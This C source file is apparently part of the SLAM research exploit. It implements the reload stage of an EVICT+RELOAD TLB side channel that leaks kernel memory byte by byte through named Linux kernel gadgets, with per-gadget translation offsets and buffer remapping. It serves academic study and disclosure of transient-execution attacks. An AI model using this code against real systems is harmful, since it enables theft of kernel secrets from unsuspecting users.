/* Reload functionality for EVICT+RELOAD on the TLB.
 *
 * Date: November 23, 2023
 * Author: Mathé Hertogh - Vrije Universiteit Amsterdam
 */

#include "slam.h"

#ifdef IDEAL
#define TRANSLATION_OFFSET 0x0
#endif
#ifdef CGROUP_SEQFILE_SHOW
#define TRANSLATION_OFFSET 0x60
#endif
#ifdef EXT4_FILE_OPEN
#define TRANSLATION_OFFSET 0x230
#endif
#ifdef EXT4_FILE_WRITE_ITER
#define TRANSLATION_OFFSET 0x28
#endif
#ifdef HUGETLBFS_READ_ITER
#define TRANSLATION_OFFSET 0x28
#endif
#ifdef KERNFS_FOP_READ_ITER
#define TRANSLATION_OFFSET 0x70
#endif
#ifdef KERNFS_SEQ_SHOW
#define TRANSLATION_OFFSET 0x48
#endif
#ifdef PROC_SIGNLE_SHOW
#define TRANSLATION_OFFSET 0x398
#endif
#ifdef RAW_SEQ_START
#define TRANSLATION_OFFSET 0x270
#endif
#ifdef SEL_READ_MLS
#define TRANSLATION_OFFSET 0x398
#endif
#ifdef SHMEM_FAULT
#define TRANSLATION_OFFSET 0x20
#endif
#ifdef SHMEM_STATFS
#define TRANSLATION_OFFSET 0x0
#endif

#ifndef TRANSLATION_OFFSET
#error "Error: no gadget specified. Please choose a gadget using `make CFLAGS=-D$GADGET`, cf. slam.h"
#include <stop_compilation_due_to_missing_gadget>
#endif

/* Reload buffer, used to measure dTLB hits versus misses.
 */
static void *rlbuf;

void reload_init()
{
        pr_verbose("=====[Reload initialization]=====\n");
        rlbuf = alloc_contiguous_pages(NULL, 1);
        reload_move_buf((void *)((lrand() & 0x00007ffffffff000UL) | 0x1000));
        pr_verbose("\n");
}

char *reload_buf()
{
        return rlbuf;
}

void reload_move_buf(void *new_addr)
{
        if (new_addr == rlbuf)
                return;

        if ((uint64_t)new_addr & 0xffff800000000000) {
                pr_err("invalid reload buffer address: %p\n", new_addr);
                fail("leaked wrong (non-ascii) bytes\n");
        }

        // Actually, we move all but the last (read-only) page.
        rlbuf = mremap(rlbuf, HUGE_PAGE_SIZE-PAGE_SIZE, HUGE_PAGE_SIZE-PAGE_SIZE, MREMAP_MAYMOVE|MREMAP_FIXED, new_addr);
        if (rlbuf == MAP_FAILED) {
		pr_err("mremap at %p: %s\n", new_addr, strerror(errno));
		fail("reload_move_buf failed");
	}
}

/* Given 3.5 known bytes in @data_ptr, replace the reload buffer in virtual
 * address space such that the next byte to leak hits somewhere within the
 * reload buffer.
 * On AMD we experienced 8-multi-hits if our reload buffer was 15-bits aligned.
 * To circumvent this, we allow misaligning the buffer via @misalignment.
 */
void reload_replace_buf(const char *data_ptr, int misalignment)
{
        uint64_t data = *(uint64_t *)data_ptr;
        uint64_t addr = data & 0x0000fffffff00000;
        // Compensate for a potential page-overflow due to the gadget's
        // translation offset.
        addr += ((data & 0xfff) + TRANSLATION_OFFSET) & 0x1000;
        addr += misalignment * PAGE_SIZE;
        reload_move_buf((void *)addr);
}

uint64_t reload(int reload_idx)
{
        char *reload_ptr = (char *)rlbuf + reload_idx*PAGE_SIZE;
        return time_access(reload_ptr);
}
